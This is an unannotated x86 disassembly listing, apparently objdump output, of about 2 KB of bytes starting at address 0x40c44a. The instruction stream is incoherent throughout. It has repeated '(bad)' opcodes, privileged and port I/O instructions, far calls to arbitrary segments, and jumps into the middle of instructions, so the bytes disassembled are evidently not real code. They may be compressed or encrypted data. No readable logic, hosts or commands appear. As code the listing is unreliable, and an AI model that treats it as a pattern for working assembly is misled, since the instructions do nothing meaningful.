  40c44a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c44b:	cdq    
  40c44c:	cmp    al,0xd
  40c44e:	test   eax,0xfee7b26c
  40c453:	add    ecx,0x89512f8c
  40c459:	push   ss
  40c45a:	mov    al,0xf6
  40c45c:	fcmovnbe st,st(2)
  40c45e:	mov    ah,0x70
  40c460:	jb     0x40c3f2
  40c462:	mov    eax,0xe32bfa61
  40c467:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c468:	in     al,0xae
  40c46a:	add    al,0xc3
  40c46c:	ins    DWORD PTR es:[edi],dx
  40c46d:	pop    ebx
  40c46e:	dec    ebx
  40c46f:	or     DWORD PTR [eax],0x3e2a27d7
  40c475:	rol    DWORD PTR [ebp+0x44f189b1],0xc3
  40c47c:	jbe    0x40c450
  40c47e:	add    ebx,DWORD PTR [ebx-0x292c204a]
  40c484:	call   0x1296:0xc8e1762c
  40c48b:	mov    ds:0x812c8b52,al
  40c490:	jns    0x40c431
  40c492:	cld    
  40c493:	push   DWORD PTR [ecx+0x68]
  40c496:	mov    dl,cl
  40c498:	push   ebx
  40c499:	xor    al,0xc8
  40c49b:	push   0xd995e855
  40c4a0:	mov    fs,esi
  40c4a2:	pop    eax
  40c4a3:	adc    edx,DWORD PTR ss:[edx-0x47]
  40c4a7:	call   0xc7f5c551
  40c4ac:	add    DWORD PTR [esi+0x64aa115a],0x2ff748a0
  40c4b6:	fnstcw WORD PTR [edx+0x66480f50]
  40c4bc:	jp     0x40c4d5
  40c4be:	in     eax,dx
  40c4bf:	pop    ebp
  40c4c0:	iret   
  40c4c1:	dec    esp
  40c4c2:	ss dec ecx
  40c4c4:	dec    ebx
  40c4c5:	ror    DWORD PTR [ebp+0x748f49be],0x1f
  40c4cc:	scas   al,BYTE PTR es:[edi]
  40c4cd:	out    dx,al
  40c4ce:	cmp    DWORD PTR [edi+ebp*4+0x50],ebp
  40c4d2:	pop    es
  40c4d3:	add    eax,0xe7ad04ed
  40c4d8:	mov    BYTE PTR [ecx+0x1c8ac052],cl
  40c4de:	pop    ebx
  40c4df:	push   ss
  40c4e0:	mov    esi,0x304e36f9
  40c4e5:	leave  
  40c4e6:	adc    eax,0x41bdf4e4
  40c4eb:	inc    edx
  40c4ec:	lods   eax,DWORD PTR ds:[esi]
  40c4ed:	fs jns 0x40c526
  40c4f0:	xchg   ebp,eax
  40c4f1:	popa   
  40c4f2:	xor    eax,0x927060dc
  40c4f7:	ins    BYTE PTR es:[edi],dx
  40c4f8:	(bad)  
  40c4f9:	cmp    eax,DWORD PTR [edx+eax*8-0x57231f37]
  40c500:	pop    ds
  40c501:	test   eax,0x274b7d42
  40c506:	ins    BYTE PTR es:[edi],dx
  40c507:	fmul   QWORD PTR [esp+edx*4]
  40c50a:	loopne 0x40c556
  40c50c:	ret    0x19e3
  40c50f:	outs   dx,DWORD PTR ds:[esi]
  40c510:	rol    ah,0x41
  40c513:	jbe    0x40c557
  40c515:	outs   dx,BYTE PTR ds:[esi]
  40c516:	ja     0x40c4cb
  40c518:	jg     0x40c58a
  40c51a:	je     0x40c521
  40c51c:	sahf   
  40c51d:	ins    BYTE PTR es:[edi],dx
  40c51e:	push   ebx
  40c51f:	cld    
  40c520:	or     BYTE PTR [esi+0x6d],ah
  40c523:	test   al,0x5d
  40c525:	sub    DWORD PTR [ecx-0x4f],0x4cf99a98
  40c52c:	lock in eax,dx
  40c52e:	adc    eax,0x4e402688
  40c533:	cmp    BYTE PTR [ecx+0x58305ce],bh
  40c539:	jno    0x40c502
  40c53b:	out    0x54,al
  40c53d:	test   al,0x21
  40c53f:	or     edx,DWORD PTR [ebx]
  40c541:	sub    BYTE PTR [ebp-0x3c5664a7],ch
  40c547:	rcr    BYTE PTR [esi-0x40eff839],cl
  40c54d:	mov    DWORD PTR [edx],edi
  40c54f:	cs into 
  40c551:	inc    ebx
  40c552:	(bad)  
  40c554:	mov    dh,BYTE PTR [edi+0x684d2a37]
  40c55a:	fwait
  40c55b:	loope  0x40c5a7
  40c55d:	dec    edx
  40c55e:	ss test al,0xc9
  40c561:	push   es
  40c562:	push   ebx
  40c563:	es ja  0x40c50c
  40c566:	pop    esi
  40c567:	sbb    eax,DWORD PTR [esp+edi*8+0x166b9f7e]
  40c56e:	mov    eax,ds:0x8aa0273c
  40c573:	adc    al,0xc7
  40c575:	stc    
  40c576:	frstor [edi]
  40c578:	ror    DWORD PTR [esi-0x4d183831],1
  40c57e:	inc    ebx
  40c57f:	or     al,0x79
  40c581:	fistp  WORD PTR [esi+0x19260c56]
  40c587:	loopne 0x40c5c5
  40c589:	outs   dx,DWORD PTR ds:[esi]
  40c58a:	inc    ecx
  40c58b:	add    DWORD PTR [ebx+0x2a],ebp
  40c58e:	push   edi
  40c58f:	push   ds
  40c590:	ja     0x40c5d5
  40c592:	or     eax,0xa00d8e2
  40c597:	add    ebp,ebp
  40c599:	inc    ebx
  40c59a:	jle    0x40c55c
  40c59c:	shr    BYTE PTR [ecx+0x47502733],0xf5
  40c5a3:	mov    ch,0x36
  40c5a5:	pop    ds
  40c5a6:	cmc    
  40c5a7:	fwait
  40c5a8:	call   0xe652ddf2
  40c5ad:	inc    ecx
  40c5ae:	imul   eax,ecx,0xfbce957a
  40c5b4:	scas   al,BYTE PTR es:[edi]
  40c5b5:	into   
  40c5b6:	cmp    edx,0x5abdf1df
  40c5bc:	pop    eax
  40c5bd:	dec    esp
  40c5be:	rcr    edi,0x5c
  40c5c1:	jge    0x40c636
  40c5c3:	adc    BYTE PTR [esi],cl
  40c5c5:	pop    ebx
  40c5c6:	test   eax,0x3b2e86bd
  40c5cb:	lods   eax,DWORD PTR ds:[esi]
  40c5cc:	mov    bl,0xc5
  40c5ce:	jmp    0x2986a53c
  40c5d3:	add    edi,0x7d935f05
  40c5d9:	sbb    DWORD PTR [ebx+0xc5c645d],eax
  40c5df:	jno    0x40c5c7
  40c5e1:	stos   DWORD PTR es:[edi],eax
  40c5e2:	adc    dl,ch
  40c5e4:	(bad)  
  40c5e5:	(bad)  
  40c5e7:	lods   eax,DWORD PTR ds:[esi]
  40c5e8:	and    BYTE PTR [eax],cl
  40c5ea:	js     0x40c5e7
  40c5ec:	adc    dh,BYTE PTR [edi]
  40c5ee:	jle    0x40c599
  40c5f0:	xor    eax,0x64e4e4e0
  40c5f5:	sub    cl,dl
  40c5f7:	loopne 0x40c614
  40c5f9:	loop   0x40c5c8
  40c5fb:	xchg   BYTE PTR [ebx-0x6c],ah
  40c5fe:	inc    edi
  40c5ff:	aam    0xbe
  40c601:	div    DWORD PTR [eax+eax*4-0x41453901]
  40c608:	leave  
  40c609:	xchg   ebp,eax
  40c60a:	adc    DWORD PTR [ebp-0x6ca22086],0x66
  40c611:	xor    dl,cl
  40c613:	jbe    0x40c653
  40c615:	test   DWORD PTR [esi+0x76],esi
  40c618:	lahf   
  40c619:	sar    BYTE PTR [ecx+0x3ba45f7a],cl
  40c61f:	std    
  40c620:	(bad)  
  40c622:	test   al,0x88
  40c624:	push   ds
  40c625:	dec    edi
  40c626:	fs imul eax,esp,0xe0d704f6
  40c62d:	ja     0x40c638
  40c62f:	adc    BYTE PTR [ebp+0x62],bl
  40c632:	adc    al,0xe5
  40c634:	jae    0x40c60f
  40c636:	and    bl,BYTE PTR [ecx+0x50]
  40c639:	jb     0x40c60b
  40c63b:	push   ebp
  40c63c:	nop
  40c63d:	push   ss
  40c63e:	sbb    ebx,DWORD PTR [ebp+0x5f]
  40c641:	sahf   
  40c642:	test   dl,ah
  40c644:	ins    DWORD PTR es:[edi],dx
  40c645:	push   esi
  40c646:	xchg   edi,eax
  40c647:	xchg   esp,eax
  40c648:	inc    esp
  40c649:	icebp  
  40c64a:	test   BYTE PTR [edx-0x3987d6c8],dh
  40c650:	inc    edx
  40c651:	fdivrp st(1),st
  40c653:	xor    DWORD PTR [edi+eax*4],ecx
  40c656:	shr    dl,1
  40c658:	pop    es
  40c659:	jne    0x40c641
  40c65b:	jno    0x40c6ca
  40c65d:	sub    dl,BYTE PTR [esi]
  40c65f:	int3   
  40c660:	hlt    
  40c661:	pop    ebx
  40c662:	(bad)  
  40c663:	loopne 0x40c5e7
  40c665:	sti    
  40c666:	mov    ds:0x22370213,eax
  40c66b:	int    0x83
  40c66d:	sbb    DWORD PTR [ebp+0x10],0x36
  40c671:	lock in eax,0x70
  40c674:	inc    ecx
  40c675:	mov    bh,0xa3
  40c677:	repnz stos BYTE PTR es:[edi],al
  40c679:	loopne 0x40c672
  40c67b:	shr    DWORD PTR [ecx],cl
  40c67d:	stc    
  40c67e:	add    eax,0x96fd83a8
  40c683:	call   0x1e8ee0f5
  40c688:	repnz mov ah,0xd8
  40c68b:	bound  edx,QWORD PTR [edi-0x65bc2779]
  40c691:	js     0x40c6be
  40c693:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c694:	enter  0x26d0,0xa
  40c698:	fild   QWORD PTR [edx-0x2c]
  40c69b:	(bad)  
  40c69c:	pop    ds
  40c69d:	cmp    al,0x22
  40c69f:	push   ds
  40c6a0:	jno    0x40c695
  40c6a2:	pushfw 
  40c6a4:	div    ah
  40c6a6:	adc    bl,BYTE PTR [ebx]
  40c6a8:	ss jnp 0x40c6d9
  40c6ab:	mov    eax,ds:0x6b972268
  40c6b0:	sub    ah,BYTE PTR ds:0x6e1fc7df
  40c6b6:	and    al,0x92
  40c6b8:	or     eax,0x80b1f464
  40c6bd:	cmc    
  40c6be:	and    dl,BYTE PTR [ebp-0x60c593]
  40c6c4:	rcr    cl,cl
  40c6c6:	inc    esi
  40c6c7:	or     cl,BYTE PTR [edi]
  40c6c9:	int    0x6a
  40c6cb:	hlt    
  40c6cc:	rol    BYTE PTR [edi+0x42],cl
  40c6cf:	cmp    DWORD PTR [ebx-0x77a79e26],ebx
  40c6d5:	mov    edi,0xd144cb3d
  40c6da:	mov    dl,0x4c
  40c6dc:	cmp    eax,DWORD PTR [edi-0x4d]
  40c6df:	cs jne 0x40c676
  40c6e2:	inc    eax
  40c6e3:	sub    eax,0xc32f4ffc
  40c6e8:	loope  0x40c683
  40c6ea:	int3   
  40c6eb:	lock into 
  40c6ed:	adc    edi,DWORD PTR [esi]
  40c6ef:	mov    edi,0xa917e00
  40c6f4:	xor    eax,0xda3cba31
  40c6f9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c6fa:	ret    0xf703
  40c6fd:	push   edi
  40c6fe:	adc    DWORD PTR ds:0x27cd924c,edx
  40c704:	js     0x40c71e
  40c706:	outs   dx,BYTE PTR ds:[esi]
  40c707:	popf   
  40c708:	je     0x40c6ac
  40c70a:	cld    
  40c70b:	retf   
  40c70c:	(bad)  
  40c70d:	out    dx,al
  40c70e:	scas   al,BYTE PTR es:[edi]
  40c70f:	sbb    eax,0xf43a6c01
  40c714:	jp     0x40c6c8
  40c716:	adc    BYTE PTR [eax+0x51],0xb7
  40c71a:	sbb    BYTE PTR [ebx+0x649e7c2b],0x65
  40c721:	outs   dx,DWORD PTR ds:[esi]
  40c722:	je     0x40c75f
  40c724:	(bad)  
  40c725:	mov    dl,0x13
  40c727:	clc    
  40c728:	pop    es
  40c729:	jo     0x40c779
  40c72b:	test   al,0x51
  40c72d:	push   cs
  40c72e:	shl    DWORD PTR [edi],cl
  40c730:	or     eax,0xafbb41d2
  40c735:	in     eax,0xde
  40c737:	inc    edx
  40c738:	idiv   BYTE PTR [edi+0x6a]
  40c73b:	pusha  
  40c73c:	xlat   BYTE PTR ds:[ebx]
  40c73d:	mov    al,ds:0x5a71eb0e
  40c742:	mov    eax,0x5e753fae
  40c747:	push   ecx
  40c748:	add    BYTE PTR [edi-0x3a6ab9af],bh
  40c74e:	outs   dx,BYTE PTR gs:[esi]
  40c750:	outs   dx,DWORD PTR ds:[esi]
  40c751:	in     al,0xe3
  40c753:	and    ah,BYTE PTR [esi]
  40c755:	inc    ebx
  40c756:	fisttp DWORD PTR [esi-0x7d]
  40c759:	out    0x6f,al
  40c75b:	rcr    BYTE PTR [edx],cl
  40c75d:	les    eax,FWORD PTR [eax+0x7a432f2d]
  40c763:	cwde   
  40c764:	rol    dh,1
  40c766:	call   0x3c20:0x51a327b0
  40c76d:	imul   esi,DWORD PTR [ecx],0x26
  40c770:	and    cl,dl
  40c772:	out    dx,al
  40c773:	mov    ds:0x89aa2b9a,al
  40c778:	pop    ds
  40c779:	enter  0xebe0,0xa5
  40c77d:	loopne 0x40c705
  40c77f:	mov    eax,0x485e2781
  40c784:	xchg   ebx,eax
  40c785:	jbe    0x40c7ba
  40c787:	adc    DWORD PTR [ebp+0x3e],edi
  40c78a:	mov    edx,0xca871b77
  40c78f:	cwde   
  40c790:	leave  
  40c791:	pop    ss
  40c792:	sbb    esi,esp
  40c794:	stos   DWORD PTR es:[edi],eax
  40c795:	inc    edx
  40c796:	xor    BYTE PTR [ebx],dl
  40c798:	push   esi
  40c799:	not    BYTE PTR [ebx]
  40c79b:	dec    ebp
  40c79c:	pop    ecx
  40c79d:	jb     0x40c810
  40c79f:	(bad)  
  40c7a0:	shl    bl,1
  40c7a2:	ror    DWORD PTR [edx+0x1aaba395],cl
  40c7a8:	lods   al,BYTE PTR ds:[esi]
  40c7a9:	mov    DWORD PTR [edi+0x1a],ebp
  40c7ac:	jle    0x40c7d0
  40c7ae:	sti    
  40c7af:	pop    ecx
  40c7b0:	and    DWORD PTR [ebx],edi
  40c7b2:	and    al,0x9e
  40c7b4:	push   edx
  40c7b5:	xchg   esi,eax
  40c7b6:	rol    DWORD PTR [edi+0xa],0xb6
  40c7ba:	mov    al,ds:0x95877827
  40c7bf:	ja     0x40c759
  40c7c1:	std    
  40c7c2:	stos   DWORD PTR es:[edi],eax
  40c7c3:	mov    dh,0xb8
  40c7c5:	xchg   BYTE PTR [ebx+0x14e96074],bl
  40c7cb:	xchg   ecx,eax
  40c7cc:	cwde   
  40c7cd:	add    BYTE PTR [eax+0x7e],0xf
  40c7d1:	or     DWORD PTR [eax+esi*4+0x3ab13f58],ecx
  40c7d8:	sub    BYTE PTR [edi-0x58],al
  40c7db:	push   esp
  40c7dc:	bound  ebp,QWORD PTR [eax-0x6f]
  40c7df:	adc    al,0x1a
  40c7e1:	sub    DWORD PTR [edi+ebx*2],ecx
  40c7e4:	lods   al,BYTE PTR ds:[esi]
  40c7e5:	ret    
  40c7e6:	call   0xfc562619
  40c7eb:	inc    edx
  40c7ec:	lahf   
  40c7ed:	and    al,0x5e
  40c7ef:	das    
  40c7f0:	xchg   edi,eax
  40c7f1:	fidivr WORD PTR [edx+0x3a67271b]
  40c7f7:	lock shl DWORD PTR [esi+ecx*4-0x4b3468a3],cl
  40c7ff:	rol    BYTE PTR [ebp+edi*2+0x194e565f],1
  40c806:	and    edi,DWORD PTR [eax+0x4f5327ba]
  40c80c:	stc    
  40c80d:	mov    eax,ds:0x22643f3f
  40c812:	mov    dh,0x1f
  40c814:	xor    eax,DWORD PTR [edi]
  40c816:	inc    ebx
  40c817:	jmp    0x40c891
  40c819:	add    al,0x4a
  40c81b:	push   ebp
  40c81c:	data16 ja 0x40c848
  40c81f:	call   0x1c753807
  40c824:	outs   dx,BYTE PTR ds:[esi]
  40c825:	mov    ebp,DWORD PTR [edx+0x1d]
  40c828:	xor    eax,0x51b11b95
  40c82d:	fidivr DWORD PTR ss:[ecx+0x5f]
  40c831:	fwait
  40c832:	pop    edx
  40c833:	int3   
  40c834:	cmp    esp,ebp
  40c836:	fs dec ebx
  40c838:	icebp  
  40c839:	cmp    BYTE PTR [ecx-0x14],ch
  40c83c:	outs   dx,DWORD PTR ds:[esi]
  40c83d:	pop    edi
  40c83e:	dec    eax
  40c83f:	mov    DWORD PTR [esi+eax*4],0xe330a91a
  40c846:	sub    ebx,DWORD PTR [edx-0x1750f54]
  40c84c:	in     al,0xfd
  40c84e:	mov    ecx,0xac15d6f0
  40c853:	adc    al,0x5
  40c855:	dec    edx
  40c856:	(bad)  
  40c857:	(bad)  
  40c858:	fild   DWORD PTR [ecx-0x5a]
  40c85b:	imul   edi,DWORD PTR [edi],0xfffffff6
  40c85e:	inc    ebx
  40c85f:	in     eax,dx
  40c860:	pop    eax
  40c861:	add    BYTE PTR [ebx-0x4757e132],al
  40c867:	and    al,0x9c
  40c869:	enter  0x8cb7,0xaa
  40c86d:	jle    0x40c889
  40c86f:	mov    al,ds:0xeb2409a8
  40c874:	adc    edx,esi
  40c876:	jp     0x40c8dc
  40c878:	mov    ebp,0x578b3d9a
  40c87d:	bound  ebx,QWORD PTR [ebx]
  40c87f:	clc    
  40c880:	dec    edi
  40c881:	pop    eax
  40c882:	out    dx,al
  40c883:	adc    esp,ebp
  40c885:	les    eax,FWORD PTR [eax]
  40c887:	or     BYTE PTR [edi-0x21],al
  40c88a:	jbe    0x40c848
  40c88c:	pusha  
  40c88d:	mov    ah,ah
  40c88f:	mov    BYTE PTR [eax-0x48],bl
  40c892:	shr    BYTE PTR [ecx-0x65],cl
  40c895:	data16 (bad) 
  40c897:	loopne 0x40c827
  40c899:	dec    ebx
  40c89a:	(bad)  
  40c89b:	or     al,0x32
  40c89d:	inc    edx
  40c89e:	and    DWORD PTR [ebx-0x78666a2],eax
  40c8a4:	lahf   
  40c8a5:	push   esp
  40c8a6:	sti    
  40c8a7:	das    
  40c8a8:	xchg   DWORD PTR [ebp-0x38772b21],esp
  40c8ae:	or     al,0x6d
  40c8b0:	rcl    BYTE PTR [eax],1
  40c8b2:	lods   al,BYTE PTR ds:[esi]
  40c8b3:	fsubr  st,st(2)
  40c8b5:	and    edx,0xed8c7d70
  40c8bb:	add    eax,0x543c06b5
  40c8c0:	inc    ebp
  40c8c1:	push   esp
  40c8c2:	jne    0x40c939
  40c8c4:	pushf  
  40c8c5:	retf   
  40c8c6:	(bad)  
  40c8c7:	xor    ebx,DWORD PTR [bx+di]
  40c8ca:	(bad)  
  40c8cb:	mov    ds:0xdf99192,eax
  40c8d0:	sar    BYTE PTR [ecx],1
  40c8d2:	loop   0x40c90b
  40c8d4:	scas   al,BYTE PTR es:[edi]
  40c8d5:	dec    esp
  40c8d6:	test   eax,0x8f7c56c8
  40c8db:	fs ins BYTE PTR es:[edi],dx
  40c8dd:	sbb    eax,0xfc1ce6cd
  40c8e2:	xchg   edx,eax
  40c8e3:	sub    al,0x22
  40c8e5:	lods   eax,DWORD PTR ds:[esi]
  40c8e6:	xchg   DWORD PTR [edx+0x61],ebx
  40c8e9:	or     eax,0xe60020f8
  40c8ee:	test   DWORD PTR [edi-0x54],edi
  40c8f1:	stos   DWORD PTR es:[edi],eax
  40c8f2:	mov    al,ds:0xda4999f4
  40c8f7:	call   0xb20e:0xa8407008
  40c8fe:	jmp    0x40c8ae
  40c900:	pop    es
  40c901:	into   
  40c902:	mov    dl,0x9c
  40c904:	mov    ecx,0x9087c506
  40c909:	push   esi
  40c90a:	in     al,dx
  40c90b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c90c:	adc    eax,0xd6810142
  40c911:	loope  0x40c906
  40c913:	aam    0x9b
  40c915:	push   ebp
  40c916:	fdiv   DWORD PTR [esi]
  40c918:	mov    edi,DWORD PTR [ebp-0x1e]
  40c91b:	int    0x6d
  40c91d:	xchg   esi,eax
  40c91e:	icebp  
  40c91f:	jne    0x40c8a9
  40c921:	gs push esi
  40c923:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c924:	into   
  40c925:	sbb    eax,0xf539bdeb
  40c92a:	scas   al,BYTE PTR es:[edi]
  40c92b:	mov    cs:0x74c4a490,al
  40c931:	int3   
  40c932:	pop    esi
  40c933:	push   ebp
  40c934:	pop    eax
  40c935:	out    0xf,al
  40c937:	push   ebx
  40c938:	jo     0x40c974
  40c93a:	mov    ebp,0x971b78a8
  40c93f:	shl    dl,cl
  40c941:	pop    ds
  40c942:	mov    BYTE PTR [ebx],ah
  40c944:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c945:	mov    eax,0xf1453608
  40c94a:	xchg   ecx,eax
  40c94b:	push   es
  40c94c:	inc    esp
  40c94d:	cmp    ecx,DWORD PTR [esi-0x59c61599]
  40c953:	sbb    BYTE PTR [edi],bh
  40c955:	das    
  40c956:	test   DWORD PTR [edi],edi
  40c958:	mov    ecx,0xe24f390d
  40c95d:	jp     0x40c8e6
  40c95f:	mov    ?,WORD PTR [esi]
  40c961:	addr16 mov ds:0xee1f,al
  40c965:	lea    edi,ds:0x9ead370f
  40c96b:	mov    edx,0x4ef03bd
  40c970:	inc    ecx
  40c971:	or     al,0xa1
  40c973:	and    eax,0x27936540
  40c978:	std    
  40c979:	call   0xf9750667
  40c97e:	gs test eax,0xb24ecb7b
  40c984:	xor    eax,0xfafe7409
  40c989:	call   0xe89d:0xa51f9ef7
  40c990:	dec    ebx
  40c991:	dec    esp
  40c992:	scas   al,BYTE PTR es:[edi]
  40c993:	sar    DWORD PTR [esi-0x57],1
  40c996:	push   esi
  40c997:	repnz retf 0xbaa7
  40c99b:	adc    eax,0x1cf09e8d
  40c9a0:	dec    edi
  40c9a1:	xchg   edx,eax
  40c9a2:	mov    bl,0x9c
  40c9a4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c9a5:	push   ebp
  40c9a6:	sub    al,0x4a
  40c9a8:	popa   
  40c9a9:	dec    esp
  40c9aa:	mov    ecx,0xd9cebc28
  40c9af:	dec    eax
  40c9b0:	and    DWORD PTR [ebx-0x569a2e76],ebx
  40c9b6:	out    dx,al
  40c9b7:	int    0x29
  40c9b9:	dec    edi
  40c9ba:	xchg   ebx,eax
  40c9bb:	stos   BYTE PTR es:[edi],al
  40c9bc:	cld    
  40c9bd:	stos   BYTE PTR es:[edi],al
  40c9be:	test   al,0x70
  40c9c0:	mov    cl,0xbf
  40c9c2:	out    0x3f,eax
  40c9c4:	xor    sp,WORD PTR [ebx]
  40c9c7:	dec    DWORD PTR [ecx+0x974fe5d]
  40c9cd:	inc    edx
  40c9ce:	rcr    BYTE PTR [ebx+0x2f2a6eef],1
  40c9d4:	scas   eax,DWORD PTR es:[edi]
  40c9d5:	rcl    DWORD PTR es:[ecx+edx*8-0x7e],1
  40c9da:	adc    al,0xda
  40c9dc:	jns    0x40c9b9
  40c9de:	jmp    0xcca334aa
  40c9e3:	out    dx,eax
  40c9e4:	inc    ecx
  40c9e5:	aad    0x8b
  40c9e7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c9e8:	(bad)  
  40c9ea:	sbb    esp,DWORD PTR [edx+0x46]
  40c9ed:	loopne 0x40c9b8
  40c9ef:	and    al,0xd7
  40c9f1:	(bad)
  40c9f4:	ins    BYTE PTR es:[edi],dx
  40c9f5:	fdivr  QWORD PTR [edx]
  40c9f7:	xchg   edi,eax
  40c9f8:	ins    DWORD PTR es:[edi],dx
  40c9f9:	bound  edx,QWORD PTR [esi-0x5d3470c8]
  40c9ff:	sub    esi,0x89cb0880
  40ca05:	cs push ebx
  40ca07:	xchg   ebp,eax
  40ca08:	js     0x40ca19
  40ca0a:	retf   0x890f
  40ca0d:	cmp    al,ch
  40ca0f:	adc    DWORD PTR [eax+0xadcacbd],ebx
  40ca15:	pop    esp
  40ca16:	or     eax,0x9884f53e
  40ca1b:	ins    BYTE PTR es:[edi],dx
  40ca1c:	xor    BYTE PTR cs:[edi],0x8f
  40ca20:	jae    0x40c9c0
  40ca22:	pop    esp
  40ca23:	jl     0x40c9fb
  40ca25:	arpl   WORD PTR [eax+0x2152a8],ax
  40ca2b:	push   ds
  40ca2c:	dec    ebx
  40ca2d:	jecxz  0x40ca68
  40ca2f:	fdiv   QWORD PTR [ebp+0x52251dbe]
  40ca35:	inc    edx
  40ca36:	icebp  
  40ca37:	sbb    al,0xe4
  40ca39:	mov    BYTE PTR [ecx+0x49ba36c0],al
  40ca3f:	(bad)  
  40ca40:	pop    ecx
  40ca41:	or     al,0x53
  40ca43:	jle    0x40ca81
  40ca45:	and    DWORD PTR es:[edi],ebp
  40ca48:	call   0x234a3f67
  40ca4d:	add    DWORD PTR [edi+eiz*4+0x5c],esi
  40ca51:	push   0x521ba8db
  40ca56:	icebp  
  40ca57:	aas    
  40ca58:	cmp    BYTE PTR [ebx],0xf7
  40ca5b:	push   0x58
  40ca5d:	int    0x1
  40ca5f:	mov    al,0xf9
  40ca61:	sub    al,0x43
  40ca63:	dec    ecx
  40ca64:	hlt    
  40ca65:	imul   esi,esp,0x22ec5edf
  40ca6b:	xchg   edi,eax
  40ca6c:	and    ebp,DWORD PTR [edi+0x583f566c]
  40ca72:	mov    al,0xa
  40ca74:	sbb    ch,BYTE PTR [ecx+0x6c321c7a]
  40ca7a:	cmp    DWORD PTR [esi],esp
  40ca7c:	call   0x19cb:0xaf4169f0
  40ca83:	mov    cl,0x5d
  40ca85:	pop    ecx
  40ca86:	aam    0xbd
  40ca88:	sub    al,0xb3
  40ca8a:	daa    
  40ca8b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ca8c:	push   esi
  40ca8d:	xor    dl,BYTE PTR [ebx-0x49]
  40ca90:	pop    edi
  40ca91:	push   ds
  40ca92:	cmp    eax,0x443d28c0
  40ca97:	sbb    BYTE PTR [esi-0x62],dl
  40ca9a:	inc    esi
  40ca9b:	push   ebp
  40ca9c:	or     eax,DWORD PTR [ebx]
  40ca9e:	mov    DWORD PTR [eax],edi
  40caa0:	pop    ds
  40caa1:	rol    edx,0x98
  40caa4:	enter  0x6584,0x6c
  40caa8:	add    eax,0xf9da08b4
  40caad:	jle    0x40ca78
  40caaf:	enter  0xe01,0x7b
  40cab3:	sbb    eax,0x39e305c3
  40cab8:	je     0x40ca74
  40caba:	fs (bad) 
  40cabc:	in     al,dx
  40cabd:	sbb    ebp,DWORD PTR [ebx+0x6f4ba535]
  40cac3:	push   ebp
  40cac4:	(bad)  
  40cac5:	cmp    BYTE PTR [edi],cl
  40cac7:	mov    esp,0x70ebd97c
  40cacc:	repz jl 0x40cb01
  40cacf:	sti    
  40cad0:	retf   
  40cad1:	jo     0x40cb1c
  40cad3:	mov    ax,0xef3d
  40cad7:	push   es
  40cad8:	ficomp DWORD PTR [edx*8+0x10540286]
  40cadf:	stos   BYTE PTR es:[edi],al
  40cae0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cae1:	mov    eax,ds:0x5dd37a00
  40cae6:	push   esi
  40cae7:	repnz test eax,0xd5aa1e
  40caed:	ins    BYTE PTR es:[edi],dx
  40caee:	xlat   BYTE PTR ds:[ebx]
  40caef:	xchg   ecx,eax
  40caf0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40caf1:	mov    ah,0xa9
  40caf3:	mov    gs,WORD PTR [edx+esi*2]
  40caf6:	inc    DWORD PTR [edi+ecx*1-0x619792f9]
  40cafd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cafe:	jne    0x40caa2
  40cb00:	and    DWORD PTR [edx-0x16458ede],ebx
  40cb06:	scas   eax,DWORD PTR es:[edi]
  40cb07:	in     eax,0x70
  40cb09:	imul   BYTE PTR [edi+0x6a2dc16a]
  40cb0f:	dec    ebp
  40cb10:	enter  0xd95e,0x4c
  40cb14:	pop    edi
  40cb15:	pop    ebx
  40cb16:	call   0x10e:0xa7761355
  40cb1d:	add    eax,0x22ed79ae
  40cb22:	jmp    0xbe7d:0xcfee9739
  40cb29:	js     0x40cb6c
  40cb2b:	movsx  esp,ah
  40cb2e:	push   0x2e99838e
  40cb33:	mov    ch,0x8d
  40cb35:	in     eax,0xcb
  40cb37:	xor    ch,bh
  40cb39:	push   ss
  40cb3a:	push   ebp
  40cb3b:	int    0x88
  40cb3d:	xlat   BYTE PTR ds:[ebx]
  40cb3e:	cmp    eax,0x2507f615
  40cb43:	in     al,dx
  40cb44:	xchg   esi,eax
  40cb45:	aaa    
  40cb46:	mov    ah,0xb1
  40cb48:	add    al,0xc8
  40cb4a:	mov    al,bh
  40cb4c:	xor    eax,DWORD PTR [ecx+0x4b]
  40cb4f:	aad    0xc4
  40cb51:	adc    DWORD PTR [edx],ebp
  40cb53:	dec    edx
  40cb54:	dec    ebp
  40cb55:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40cb56:	sbb    DWORD PTR [ebp-0x6f],ebp
  40cb59:	mov    eax,ds:0x96e7ce97
  40cb5e:	cmp    edx,DWORD PTR [edx+0xf]
  40cb61:	mov    ebp,0x238e7175
  40cb66:	dec    edx
  40cb67:	arpl   WORD PTR [edi-0x51c8d6ae],sp
  40cb6d:	jns    0x40cb91
  40cb6f:	jl     0x40cb1c
  40cb71:	adc    esp,esi
  40cb73:	mov    edi,0x2fb734b8
  40cb78:	adc    cl,BYTE PTR [edi+0x154e7cd1]
  40cb7e:	and    al,BYTE PTR [ecx-0x65]
  40cb81:	pushf  
  40cb82:	out    0xc7,eax
  40cb84:	xor    al,0xb4
  40cb86:	adc    eax,ebp
  40cb88:	mov    bh,0x1e
  40cb8a:	out    0xdd,eax
  40cb8c:	xchg   ebp,eax
  40cb8d:	xlat   BYTE PTR ds:[ebx]
  40cb8e:	inc    edx
  40cb8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40cb90:	xor    esi,0x2b2bba5a
  40cb96:	ins    BYTE PTR es:[edi],dx
  40cb97:	pop    esi
  40cb98:	mov    ds:0xa7e7d8ed,al
  40cb9d:	dec    ebx
  40cb9e:	rcr    BYTE PTR [eax+eiz*1],0xa3
  40cba2:	fnsave [edx-0x64]
  40cba5:	pop    ss
  40cba6:	pop    esp
  40cba7:	out    0x23,eax
  40cba9:	enter  0xda86,0x6d
  40cbad:	es mov bl,0xff
  40cbb0:	ins    DWORD PTR es:[edi],dx
